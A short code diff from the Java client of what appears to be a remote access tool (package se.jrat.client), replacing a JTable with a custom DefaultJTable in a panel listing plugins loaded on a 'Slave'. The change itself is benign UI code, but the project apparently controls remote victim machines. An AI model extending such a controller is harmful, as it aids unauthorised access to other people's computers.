@@ -14,6 +14,7 @@ import javax.swing.table.DefaultTableModel;
 
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet89LoadedPlugins;
+import se.jrat.client.ui.components.DefaultJTable;
 import se.jrat.client.ui.renderers.table.PluginsTableRenderer;
 import se.jrat.client.utils.IconUtils;
 
@@ -57,7 +58,7 @@ public class PanelControlLoadedPlugins extends PanelControlParent {
 		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 599, GroupLayout.PREFERRED_SIZE).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(btnReload).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnClear))).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
 		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 303, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(btnReload).addComponent(btnClear)).addContainerGap(18, Short.MAX_VALUE)));
 
-		table = new JTable();
+		table = new DefaultJTable();
 		table.setDefaultRenderer(Object.class, new PluginsTableRenderer());
 		table.setRowHeight(25);
 		table.setModel(new DefaultTableModel(new Object[][] {}, new String[] { "Name" }) {
